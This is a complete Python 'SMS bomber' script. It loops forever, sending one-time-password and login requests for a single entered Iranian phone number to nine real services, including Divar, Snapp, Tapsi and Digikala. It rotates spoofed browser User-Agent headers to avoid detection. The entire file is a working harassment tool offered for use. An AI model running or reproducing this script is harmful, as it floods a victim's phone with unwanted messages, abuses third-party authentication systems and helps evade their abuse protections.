import requests
import re
import time
from colorama import Fore, init

# Initialize colorama to reset color after each print
init(autoreset=True)

# List of headers with different User-Agent values to mimic different browsers
headers_list = [
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': '*/*'},
    {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0', 'Accept': '*/*'},
    {'User-Agent': 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0', 'Accept': '*/*'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': '*/*'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0', 'Accept': '*/*'},
    {'User-Agent': 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0', 'Accept': '*/*'},
    {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3', 'accept': 'application/json, text/plain, */*'},
    {'user-agent': 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4', 'accept': 'application/json, text/plain, */*'}
]

# Function to get the next header from the list in a cyclic manner
def get_next_header(index):
    return headers_list[index % len(headers_list)]

# Function to validate phone number (Iranian format: 0 followed by 10 digits)
def is_valid_phone_number(number):
    return re.fullmatch(r'0\d{10}', number) is not None

# Function to send HTTP POST request with JSON payload
def send_request(url, json_data, headers, service_name, current_header, total_headers):
    try:
        # Send POST request
        req = requests.post(url, json=json_data, headers=headers)
        req.raise_for_status()
        print(f"{Fore.YELLOW}[+] {service_name} - Message Sended - ({current_header} - {total_headers})")
        return True
    except requests.exceptions.RequestException as e:
        # Handle request exceptions
        print(f"{Fore.LIGHTRED_EX}[+] {service_name} - Message Not Sended - ({current_header} - {total_headers}) - Error: {e}")
        return False

# Function to send authentication request to Divar service
def send_auth_request_divar(phone_number, headers, current_header, total_headers):
    url_divar = "https://api.divar.ir/v5/auth/authenticate"
    json_divar = {"phone": phone_number}
    return send_request(url_divar, json_divar, headers, "Divar", current_header, total_headers)

# Function to send authentication request to Avanland service
def send_auth_request_avanland(phone_number, headers, current_header, total_headers):
    url_avanland = "https://avanland.com/wp-content/plugins/digi-style-login/include/custom-ajax-handler/ajax.php"
    json_avanland = {
        "action": "verify_user_login",
        "fast_ajax": "true",
        "user": phone_number,
        "duty": "send_otp_to_user"
    }
    return send_request(url_avanland, json_avanland, headers, "Avanland", current_header, total_headers)

# Function to send authentication request to Tapsi service
def send_auth_request_tapsi(phone_number, headers, current_header, total_headers):
    url_tapsi = "https://tap33.me/api/v2/user"
    json_tapsi = {"credential": {"phoneNumber": phone_number, "role": "DRIVER"}}
    return send_request(url_tapsi, json_tapsi, headers, "Tapsi", current_header, total_headers)

# Function to send authentication request to Snap service
def send_auth_request_snap(phone_number, headers, current_header, total_headers):
    url_snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    json_snap = {"cellphone": phone_number}
    return send_request(url_snap, json_snap, headers, "Snap", current_header, total_headers)

# Function to send authentication request to Sheypoor service
def send_auth_request_sheypoor(phone_number, headers, current_header, total_headers):
    url_sheypoor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
    json_sheypoor = {"username": phone_number}
    return send_request(url_sheypoor, json_sheypoor, headers, "Sheypoor", current_header, total_headers)

# Function to send authentication request to Digikala service
def send_auth_request_digikala(phone_number, headers, current_header, total_headers):
    url_digikala = "https://api.digikala.com/v1/user/authenticate/"
    json_digikala = {"backUrl": "/", "username": phone_number, "otp_call": "false"}
    return send_request(url_digikala, json_digikala, headers, "Digikala", current_header, total_headers)

# Function to send authentication request to Namava service
def send_auth_request_namava(phone_number, headers, current_header, total_headers):
    url_namava = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
    json_namava = {"UserName": phone_number}
    return send_request(url_namava, json_namava, headers, "Namava", current_header, total_headers)

# Function to send authentication request to Basalam service
def send_auth_request_basalam(phone_number, headers, current_header, total_headers):
    url_basalam = "https://auth.basalam.com/otp-request"
    json_basalam = {"mobile": phone_number, "client_id": 11}
    return send_request(url_basalam, json_basalam, headers, "Basalam", current_header, total_headers)

# Function to send authentication request to Emtiaz service
def send_auth_request_emtiaz(phone_number, headers, current_header, total_headers):
    url_emtiaz = "https://api.zarinplus.com/user/zarinpal-login"
    json_emtiaz = {"phone_number": phone_number, "source": "zarinplus"}
    return send_request(url_emtiaz, json_emtiaz, headers, "Emtiaz", current_header, total_headers)

def main():
    # Display developer information
    developer_name = "SAFA"
    version = "1.1"
    print(f"{Fore.CYAN}Developer: {developer_name}")
    print(f"{Fore.WHITE}Version: {version}")

    index = 0
    total_headers = len(headers_list)

    while True:
        # Prompt user for phone number
        number = input(f"{Fore.CYAN}Enter Your Phone number (with leading 0): ")

        # Validate phone number format
        if is_valid_phone_number(number):
            print("Phone number is valid.")
            while True:
                headers = get_next_header(index)
                current_header = index + 1
                index += 1

                # Send authentication requests to all services
                send_auth_request_divar(number, headers, current_header, total_headers)
                send_auth_request_avanland(number, headers, current_header, total_headers)
                send_auth_request_tapsi(number, headers, current_header, total_headers)
                send_auth_request_snap(number, headers, current_header, total_headers)
                send_auth_request_sheypoor(number, headers, current_header, total_headers)
                send_auth_request_digikala(number, headers, current_header, total_headers)
                send_auth_request_namava(number, headers, current_header, total_headers)
                send_auth_request_basalam(number, headers, current_header, total_headers)
                send_auth_request_emtiaz(number, headers, current_header, total_headers)

                # Delay between requests
                time.sleep(1)
        else:
            print("Invalid phone number. Please enter an 11-digit number with leading 0.")

# Entry point of the script
if __name__ == "__main__":
    main()
